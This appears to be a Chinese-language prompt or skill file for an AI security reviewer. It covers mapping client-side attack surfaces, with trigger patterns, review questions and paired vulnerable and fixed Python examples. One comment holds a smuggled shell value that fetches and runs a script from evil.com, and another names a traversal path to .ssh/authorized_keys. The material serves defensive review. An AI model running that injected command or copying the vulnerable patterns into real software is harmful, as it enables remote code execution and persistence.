---
description: 客户端程序攻击面定义与优先级排序 — 反制安全专家视角
tags: [counter, target-definer, attack-surface, client-side]
---

# 目标定义器：客户端程序攻击面测绘

> **核心直觉**：当看到一个客户端程序时，反制安全专家的第一反应不是"它能做什么"，而是"服务端能借它之手做什么"。攻击方向是反转的 —— 服务端控制响应，客户端盲目执行。

---

## 一、Triggers：什么代码/配置让专家瞬间警觉？

### 1.1 解析器相关触发器
看到以下任何一种模式，立即标记为**最高价值攻击面**：

- `json.loads(response.text)` / `JSON.parse(body)` —— JSON 反序列化入口
- `yaml.load(data)` / `yaml.unsafe_load(...)` —— YAML 可执行标签解析
- `xml.etree.ElementTree.fromstring(resp)` / `DOMParser.parseFromString()` —— XXE / 实体扩展入口
- `pickle.loads(...)` / `ObjectInputStream.readObject()` —— 二进制反序列化，几乎等于 RCE
- `eval(response_data)` / `exec(server_code)` —— 直接代码执行

### 1.2 本地资源访问触发器

- `open(path, 'w')` 且 `path` 来自响应字段 —— 任意文件写入
- `os.path.join(base, server_filename)` —— 路径拼接导致目录穿越
- `shutil.copyfile(remote_path, local_path)` —— 文件复制/下载保存
- `subprocess.run(cmd, shell=True)` 且 `cmd` 含响应数据 —— 命令注入
- `os.system(...)` / `execve(...)` —— 本地命令执行管道

### 1.3 通信信道与配置触发器

- `verify=False` / `curl -k` / `SSLContext().check_hostname = False` —— TLS 校验被禁用
- `requests.get(update_url)` 且 URL 来自响应重定向 —— 更新劫持
- `config.write(key, value)` 且 key/value 来自服务端 —— 配置投毒
- `localStorage.setItem('token', server_data)` —— 凭证覆写
- `window.location = server_redirect_url` —— 开放重定向+钓鱼

### 1.4 项目类型校准矩阵

| 项目类型 | 天然高价值目标 | 典型解析器 | 重点关注 |
|----------|-------------|-----------|---------|
| 安全扫描器/Agent | 扫描目标配置、本地凭证库、执行报告命令 | JSON/YAML/XML | 命令注入、配置文件覆写 |
| 桌面管理客户端 | 系统级配置、远程指令执行通道 | JSON/XML | RCE、权限维持 |
| 数据同步工具 | 本地数据库、文件系统映射 | YAML/CSV/XML | 路径穿越、SQL注入(本地) |
| 浏览器插件/前端应用 | Cookie、LocalStorage、DOM | JSON/HTML | XSS、凭证窃取 |
| 移动 App SDK | 本地沙箱、KeyChain、SharedPreferences | JSON/Protobuf | MITM 凭证窃取、配置劫持 |

---

## 二、Question Chain：5 个不可跳过的问题

### Q1: 客户端从网络接收的数据，最终会到达哪些本地敏感操作？
- 遍历所有网络请求 → 响应处理链路
- 标记出所有到达 `eval`、`exec`、`subprocess`、`open`、`os.system`、`writeFile` 的分支
- 如果没有到达敏感操作，则攻击面价值降级

### Q2: 响应中哪些字段被直接用于本地路径构造或命令拼接？
- 查找字符串拼接/格式化操作：`f"...{data[field]}..."` / `sprintf(...)`
- 识别哪些字段值是服务器完全控制的（无白名单、无长度限制）
- 检查路径拼接前是否经过 `os.path.abspath` 或 `realpath` 校验

### Q3: 是否存在客户端完全信任服务端指令执行的"远程控制"语义？
- 查找 `action`、`cmd`、`command`、`execute`、`run` 等字段名
- 检查是否有服务端下发指令、客户端直接执行的逻辑
- 特别关注心跳、轮询、任务分发等机制中的指令解析

### Q4: 更新/配置同步机制是否可被中间人劫持？
- 更新 URL 是硬编码还是可变的？
- 更新包是否有签名验证？公钥是否硬编码？
- 配置同步是否全量覆盖本地配置？服务端可否注入恶意键值？

### Q5: 客户端在解析响应时，使用了哪些存在已知漏洞的库和配置？
- 识别解析库版本：`PyYAML < 5.1`（默认 Loader 不安全）、`lxml`（XXE 默认开启）、`jackson-databind`（ gadget 链）
- 检查解析调用是否使用了安全模式：`yaml.safe_load` vs `yaml.load`
- 识别自定义解析器中是否存在递归深度、实体扩展等拒绝服务/代码执行漏洞

---

## 三、Attack Chain Closure：从攻击者控制到完整影响的逻辑证明

### 攻击链模板

```
前提: 攻击者控制恶意服务端（或具备 MITM 能力）
      ↓
步骤1: 客户端向攻击者服务端发起正常请求（心跳/检查更新/拉取配置/下载报告）
      ↓
步骤2: 攻击者返回精心构造的恶意响应
      ↓
步骤3: 客户端解析响应，将受控数据注入到本地敏感操作
      ↓
步骤4: 本地敏感操作被触发（文件写入/命令执行/反序列化/配置覆写）
      ↓
影响: 远程代码执行 / 本地权限维持 / 凭证窃取 / 横向移动
```

### 逻辑闭合检查清单

- [ ] **控制点确认**：攻击者是否能控制响应中的至少一个字段值？
- [ ] **传递性确认**：该字段值是否未经充分过滤/校验到达敏感函数？
- [ ] **触发确认**：客户端在默认配置/正常业务流程下是否会处理该响应？
- [ ] **影响确认**：敏感函数执行后是否产生可被攻击者利用的安全影响？
- [ ] **边界确认**：是否存在沙箱、权限降维、用户交互确认等阻断因素？

---

## 四、Code Examples：攻击面识别实例

### 4.1 危险模式：服务端控制文件保存路径

```python
# ❌ 脆弱模式：服务端控制路径，可导致目录穿越写入任意文件
import requests, os

def download_report(server_url):
    resp = requests.get(f"{server_url}/api/report").json()
    filename = resp["filename"]          # 攻击者可控：../../../.ssh/authorized_keys
    content = resp["content"]
    path = os.path.join("/tmp/reports", filename)
    with open(path, "w") as f:
        f.write(content)
```

```python
# ✅ 安全模式：服务端只提供 ID，本地映射固定文件名
import requests, os, re

SAFE_NAME_RE = re.compile(r'^[a-zA-Z0-9_\-]+\.pdf$')

def download_report_safe(server_url):
    resp = requests.get(f"{server_url}/api/report").json()
    report_id = resp["report_id"]
    if not isinstance(report_id, str) or not SAFE_NAME_RE.match(report_id):
        raise ValueError("Invalid report_id")
    path = os.path.join("/tmp/reports", report_id)
    path = os.path.abspath(path)
    if not path.startswith(os.path.abspath("/tmp/reports")):
        raise ValueError("Path traversal detected")
    content = resp["content"]
    with open(path, "w") as f:
        f.write(content)
```

### 4.2 危险模式：响应数据直接进入命令行

```python
# ❌ 脆弱模式：服务端数据直接拼接到 shell 命令
import requests, subprocess

def sync_repo(server_url):
    resp = requests.get(f"{server_url}/api/repo").json()
    repo_url = resp["repo_url"]            # 攻击者可控："; curl evil.com/sh | sh #"
    cmd = f"git clone {repo_url} /tmp/repo"
    subprocess.run(cmd, shell=True)
```

```python
# ✅ 安全模式：使用列表参数，禁止 shell 解释
import requests, subprocess, shlex

def sync_repo_safe(server_url):
    resp = requests.get(f"{server_url}/api/repo").json()
    repo_url = resp["repo_url"]
    # 校验 URL 协议白名单
    if not repo_url.startswith(("https://", "http://")):
        raise ValueError("Invalid protocol")
    # 使用列表形式传递参数，避免 shell 注入
    subprocess.run(["git", "clone", repo_url, "/tmp/repo"], shell=False)
```

### 4.3 危险模式：不安全的 YAML/JSON 反序列化

```python
# ❌ 脆弱模式：YAML 默认 Loader 可执行任意 Python 对象
import requests, yaml

def load_config(server_url):
    resp = requests.get(f"{server_url}/api/config").text
    config = yaml.load(resp, Loader=yaml.Loader)   # ⚠️ 危险：可构造 !!python/object 执行代码
    return config
```

```python
# ✅ 安全模式：强制使用 SafeLoader，拒绝任意对象构造
import requests, yaml

def load_config_safe(server_url):
    resp = requests.get(f"{server_url}/api/config").text
    config = yaml.safe_load(resp)                    # 仅允许标准 YAML 标量和集合
    return config
```

### 4.4 危险模式：配置覆写导致持久化后门

```python
# ❌ 脆弱模式：服务端返回的配置直接写入本地启动文件
import requests, json, os

def update_settings(server_url):
    resp = requests.get(f"{server_url}/api/settings").json()
    settings_path = os.path.expanduser("~/.myapp/settings.json")
    with open(settings_path, "w") as f:
        json.dump(resp, f)           # 攻击者可注入恶意启动命令、代理地址、劫持 URL
```

```python
# ✅ 安全模式：白名单校验 + 备份 + 签名验证
import requests, json, os, hmac, hashlib

ALLOWED_KEYS = {"theme", "language", "auto_update", "proxy_host"}
SECRET = b"hardcoded_signing_key"  # 实际应使用独立安全存储

def update_settings_safe(server_url):
    resp = requests.get(f"{server_url}/api/settings").json()
    payload = resp.get("payload")
    signature = resp.get("signature")
    expected = hmac.new(SECRET, json.dumps(payload, sort_keys=True).encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(signature, expected):
        raise ValueError("Signature mismatch")
    filtered = {k: v for k, v in payload.items() if k in ALLOWED_KEYS}
    settings_path = os.path.expanduser("~/.myapp/settings.json")
    os.makedirs(os.path.dirname(settings_path), exist_ok=True)
    with open(settings_path + ".bak", "w") as f:
        json.dump(filtered, f)
    os.replace(settings_path + ".bak", settings_path)
```

---

## 五、输出要求

完成目标定义后，必须生成以下结构化产物：

```markdown
## 攻击面测绘报告

### 项目类型判定
- 类型: [安全扫描器/管理客户端/同步工具/浏览器插件/其他]
- 信任模型: [完全信任服务端 / 半信任 / 本地优先]

### 攻击面清单
| 优先级 | 攻击面 | 触发代码位置 | 可达性 | 利用复杂度 | 潜在影响 |
|--------|--------|-------------|--------|-----------|---------|
| P0 | JSON 反序列化 → eval | `utils.py:42` | 高（默认心跳） | 低 | RCE |
| P1 | 路径穿越文件写入 | `report.py:88` | 高（报告下载） | 低 | 本地权限维持 |
| P2 | 配置覆写 | `config.py:15` | 中（需用户触发更新） | 中 | 凭证窃取 |

### 高价值入口函数
1. `[函数名]` @ `[文件:行号]` —— 服务端响应进入本地执行的转换点

### 假设清单（供 vuln-hunter 阶段使用）
- H1: 服务端可通过 `report.filename` 实现任意文件写入
- H2: 心跳响应中的 `action` 字段可导致客户端执行任意命令
```
